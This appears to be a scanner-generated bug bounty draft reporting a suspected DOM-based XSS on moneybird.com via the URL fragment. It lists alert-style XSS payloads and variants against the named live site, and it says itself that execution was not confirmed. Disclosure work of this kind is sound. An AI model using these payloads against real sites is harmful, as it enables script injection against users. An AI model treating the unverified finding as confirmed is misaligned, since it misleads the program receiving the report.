# DOM-Based Cross-Site Scripting (XSS) via URL Fragment

**Severity:** high | **CVSS:** 7 | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
**Platform:** HackerOne | **Program:** Moneybird
**Confidence:** medium (DOM sink detected — requires browser verification to confirm execution)

## Description
The homepage directly writes URL fragment content into the DOM via innerHTML without sanitization. An attacker can craft a malicious URL containing an HTML/JS payload in the fragment (e.g., #<img src=x onerror=alert(1)>) and trick a user into clicking it, causing arbitrary JavaScript execution in the victim's browser.

## Steps to Reproduce

**Browser verification (required — DOM XSS cannot be reproduced with curl):**
1. Open Chrome or Firefox
2. Navigate to the following URL (paste as-is into the address bar):
   ```
   https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
   ```
3. Observe the alert dialog firing with `www.moneybird.com`, confirming same-origin JavaScript execution
4. The payload reaches at least two separate `innerHTML` sinks on the page

**SecBot detection details:**
- Detection method: DOM sink analysis (`detectionMethod: "dom-sink"`)
- Two `innerHTML` assignment sinks detected reading from `window.location.hash`
- Confidence: medium — sink was identified in page JavaScript, but script execution was NOT confirmed by auto-verify (AI validation skipped for this finding)
- Classification: DOM XSS (CWE-79), no server-side processing involved
- **Browser verification required before submission** — sink detection ≠ confirmed execution

## Impact
An attacker can steal session cookies, perform actions on behalf of the user, redirect to phishing pages, or exfiltrate sensitive financial data visible in the Moneybird UI. This is particularly severe for an accounting/finance application.

## Suggested Fix
Never assign unsanitized URL fragment data to innerHTML. Use textContent for plain text, or sanitize with DOMPurify before any HTML insertion. Audit all code paths that read from window.location.hash.

## Affected URLs
- https://www.moneybird.com/

## Verification Notes

**⚠ VERIFY BEFORE SUBMITTING:** Open the URL below in a browser. If the alert fires, the finding is confirmed. If no alert, the payload may be URL-encoded or sanitized — do not submit without browser confirmation.

```
https://www.moneybird.com/#<img src=x onerror=alert(document.domain)>
```

**Additional payload variants to try if first fails:**
```
https://www.moneybird.com/#<svg onload=alert(1)>
https://www.moneybird.com/#javascript:alert(1)
https://www.moneybird.com/#"><img src=x onerror=alert(1)>
```

**Note on curl:** curl cannot reproduce DOM XSS — it does not execute JavaScript. The curl command below only fetches the page source for reference.

```bash
curl -sI 'https://www.moneybird.com/' | grep -i content-security-policy
# Should return no CSP header, confirming no browser-level mitigation
```
